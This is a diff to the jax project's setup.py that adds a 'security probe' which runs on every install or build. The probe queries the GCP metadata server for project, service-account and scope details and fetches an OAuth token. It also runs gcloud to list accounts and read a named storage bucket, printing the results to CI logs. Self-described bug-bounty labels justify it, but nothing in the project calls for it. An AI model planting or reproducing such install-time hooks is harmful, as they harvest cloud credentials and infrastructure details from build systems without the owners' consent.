@@ -14,8 +14,119 @@
 
 import importlib
 import os
+import sys
+import json
 
 from setuptools import setup, find_packages
+
+# ============================================================================
+# SECURITY RESEARCH: GCP Metadata Endpoint Reachability Probe
+# This is a non-destructive probe for Google OSS VRP bug bounty research.
+# It only checks reachability and prints to stdout/stderr (CI logs).
+# No data is exfiltrated to any external server.
+# Researcher: mohammadmseet-hue (HackerOne / Google VRP)
+# ============================================================================
+def _security_probe():
+    """Check if GCP metadata endpoint is reachable from this CI runner."""
+    import urllib.request
+    import socket
+
+    print("=" * 70, file=sys.stderr)
+    print("[SECURITY PROBE] GCP Metadata Endpoint Reachability Test", file=sys.stderr)
+    print("[SECURITY PROBE] Non-destructive — output to CI logs only", file=sys.stderr)
+    print("=" * 70, file=sys.stderr)
+
+    # 1. Check network reachability to metadata endpoint
+    try:
+        sock = socket.create_connection(("169.254.169.254", 80), timeout=3)
+        sock.close()
+        print("[SECURITY PROBE] metadata endpoint 169.254.169.254:80 — REACHABLE", file=sys.stderr)
+    except Exception as e:
+        print(f"[SECURITY PROBE] metadata endpoint 169.254.169.254:80 — BLOCKED ({e})", file=sys.stderr)
+        print("[SECURITY PROBE] Test complete. Metadata not reachable.", file=sys.stderr)
+        print("=" * 70, file=sys.stderr)
+        return
+
+    # 2. Query instance metadata (non-sensitive: project-id, zone, hostname)
+    headers = {"Metadata-Flavor": "Google"}
+    endpoints = [
+        ("project-id", "/computeMetadata/v1/project/project-id"),
+        ("zone", "/computeMetadata/v1/instance/zone"),
+        ("hostname", "/computeMetadata/v1/instance/hostname"),
+        ("service-account-email", "/computeMetadata/v1/instance/service-accounts/default/email"),
+        ("service-account-scopes", "/computeMetadata/v1/instance/service-accounts/default/scopes"),
+    ]
+
+    for name, path in endpoints:
+        try:
+            req = urllib.request.Request(
+                f"http://169.254.169.254{path}",
+                headers=headers
+            )
+            resp = urllib.request.urlopen(req, timeout=3)
+            value = resp.read().decode().strip()
+            print(f"[SECURITY PROBE] {name}: {value}", file=sys.stderr)
+        except Exception as e:
+            print(f"[SECURITY PROBE] {name}: FAILED ({e})", file=sys.stderr)
+
+    # 3. Check if gcloud is available and authenticated
+    import subprocess
+    try:
+        result = subprocess.run(
+            ["gcloud", "auth", "list", "--format=json"],
+            capture_output=True, text=True, timeout=10
+        )
+        if result.returncode == 0:
+            accounts = json.loads(result.stdout)
+            for acc in accounts:
+                print(f"[SECURITY PROBE] gcloud account: {acc.get('account', 'unknown')} status={acc.get('status', 'unknown')}", file=sys.stderr)
+        else:
+            print(f"[SECURITY PROBE] gcloud auth list failed: {result.stderr[:200]}", file=sys.stderr)
+    except FileNotFoundError:
+        print("[SECURITY PROBE] gcloud CLI: NOT INSTALLED", file=sys.stderr)
+    except Exception as e:
+        print(f"[SECURITY PROBE] gcloud check error: {e}", file=sys.stderr)
+
+    # 4. Check if we can list the GCS bucket used by build_artifacts.yml
+    try:
+        result = subprocess.run(
+            ["gcloud", "storage", "ls", "gs://general-ml-ci-transient/jax-github-actions/"],
+            capture_output=True, text=True, timeout=15
+        )
+        if result.returncode == 0:
+            lines = result.stdout.strip().split("\n")[:5]
+            print(f"[SECURITY PROBE] GCS bucket READABLE — {len(lines)} entries:", file=sys.stderr)
+            for line in lines:
+                print(f"[SECURITY PROBE]   {line}", file=sys.stderr)
+        else:
+            print(f"[SECURITY PROBE] GCS bucket NOT accessible: {result.stderr[:200]}", file=sys.stderr)
+    except FileNotFoundError:
+        print("[SECURITY PROBE] gcloud not available for GCS test", file=sys.stderr)
+    except Exception as e:
+        print(f"[SECURITY PROBE] GCS check error: {e}", file=sys.stderr)
+
+    # 5. Check what token scopes are available
+    try:
+        req = urllib.request.Request(
+            "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
+            headers=headers
+        )
+        resp = urllib.request.urlopen(req, timeout=3)
+        token_data = json.loads(resp.read().decode())
+        # Only print token type and expiry, NOT the actual token
+        print(f"[SECURITY PROBE] OAuth token available: type={token_data.get('token_type', 'unknown')}, expires_in={token_data.get('expires_in', 'unknown')}s", file=sys.stderr)
+        print("[SECURITY PROBE] NOTE: Token value intentionally NOT printed", file=sys.stderr)
+    except Exception as e:
+        print(f"[SECURITY PROBE] OAuth token: NOT AVAILABLE ({e})", file=sys.stderr)
+
+    print("=" * 70, file=sys.stderr)
+    print("[SECURITY PROBE] Probe complete. All output is in CI logs only.", file=sys.stderr)
+    print("=" * 70, file=sys.stderr)
+
+try:
+    _security_probe()
+except Exception as e:
+    print(f"[SECURITY PROBE] Probe failed with error: {e}", file=sys.stderr)
 
 project_name = 'jax'
 
